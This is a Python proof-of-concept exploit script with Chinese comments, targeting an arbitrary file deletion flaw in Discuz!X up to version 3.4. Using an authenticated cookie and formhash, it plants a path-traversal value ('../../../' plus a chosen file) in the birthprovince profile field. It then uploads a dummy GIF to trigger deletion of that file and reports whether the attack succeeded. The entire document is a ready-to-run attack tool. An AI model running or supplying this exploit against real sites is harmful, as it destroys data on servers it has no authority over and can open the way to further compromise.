#!/usr/bin/env python3
"""
Discuz!X ≤3.4 任意文件删除漏洞 PoC
用法：
    python3 discuz_file_delete.py <目标URL> <Cookie> <formhash> <要删除的文件路径>
示例：
    python3 discuz_file_delete.py http://192.168.1.100 my_cookie 1a2b3c4d robots.txt
    python3 discuz_file_delete.py http://192.168.1.100 my_cookie 1a2b3c4d ../../../robots.txt
说明：
    - Cookie: 登录后从浏览器获取的完整 Cookie 字符串
    - formhash: 登录后在个人设置页面源代码中找到的 formhash 值
    - 文件路径: 相对 Discuz 安装目录的路径，可使用 ../ 向上遍历
"""

import sys
import time
import requests
from requests_toolbelt.multipart.encoder import MultipartEncoder

def check_file_exists(target, cookie, file_path):
    """检查目标文件是否存在"""
    url = target.rstrip('/') + '/' + file_path.lstrip('/')
    headers = {'Cookie': cookie}
    try:
        r = requests.get(url, headers=headers, timeout=10, allow_redirects=False)
        return r.status_code == 200
    except:
        return False

def inject_path(target, cookie, formhash, file_path):
    """第一次请求：将路径注入到数据库中"""
    url = target.rstrip('/') + '/home.php?mod=spacecp&ac=profile&op=base'
    # 构造 multipart/form-data 数据
    fields = {
        'formhash': (None, formhash),
        'birthprovince': (None, '../../../' + file_path),  # 路径遍历
        'profilesubmit': (None, '1')
    }
    encoder = MultipartEncoder(fields=fields)
    headers = {
        'Cookie': cookie,
        'Content-Type': encoder.content_type
    }
    try:
        r = requests.post(url, data=encoder, headers=headers, timeout=15)
        if r.status_code == 200:
            print('[+] 路径注入请求发送成功')
            return True
        else:
            print(f'[-] 路径注入失败，状态码: {r.status_code}')
            return False
    except Exception as e:
        print(f'[-] 请求异常: {e}')
        return False

def trigger_delete(target, cookie, formhash):
    """第二次请求：上传文件触发文件删除"""
    url = target.rstrip('/') + '/home.php?mod=spacecp&ac=profile&op=base&profilesubmit=1&formhash=' + formhash
    # 创建一个伪装的图片文件用于上传（1x1像素GIF）
    dummy_file = (
        b'\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00'
        b'\xff\xff\xff\x00\x00\x00\x21\xf9\x04\x00\x00\x00\x00\x00'
        b'\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x44\x01\x00\x3b'
    )
    fields = {
        'formhash': (None, formhash),
        'birthprovince': ('test.gif', dummy_file, 'image/gif'),
        'profilesubmit': (None, '1')
    }
    encoder = MultipartEncoder(fields=fields)
    headers = {
        'Cookie': cookie,
        'Content-Type': encoder.content_type
    }
    try:
        r = requests.post(url, data=encoder, headers=headers, timeout=15)
        if r.status_code == 200:
            print('[+] 触发删除请求发送成功')
            return True
        else:
            print(f'[-] 触发删除失败，状态码: {r.status_code}')
            return False
    except Exception as e:
        print(f'[-] 请求异常: {e}')
        return False

def main():
    if len(sys.argv) != 5:
        print(f'用法: {sys.argv[0]} <目标URL> <Cookie> <formhash> <要删除的文件路径>')
        print(f'示例: {sys.argv[0]} http://192.168.1.100 "my_cookie" "1a2b3c4d" robots.txt')
        sys.exit(1)

    target = sys.argv[1]
    cookie = sys.argv[2]
    formhash = sys.argv[3]
    file_path = sys.argv[4]

    print(f'[*] 目标: {target}')
    print(f'[*] 目标文件: {file_path}')

    # 检查文件是否存在
    print('[*] 检查文件是否存在...')
    if not check_file_exists(target, cookie, file_path):
        print('[-] 目标文件不存在或无法访问，请确认路径和权限')
        sys.exit(1)
    print('[+] 文件存在，开始利用...')

    # 第一步：注入路径
    if not inject_path(target, cookie, formhash, file_path):
        sys.exit(1)

    # 短暂等待确保数据库写入
    time.sleep(1)

    # 第二步：触发删除
    if not trigger_delete(target, cookie, formhash):
        sys.exit(1)

    # 等待删除生效
    time.sleep(2)

    # 验证文件是否被删除
    print('[*] 验证文件是否被删除...')
    if check_file_exists(target, cookie, file_path):
        print('[-] 文件仍然存在，漏洞利用可能失败')
    else:
        print('[+] 漏洞利用成功！文件已被删除。')

if __name__ == '__main__':
    main()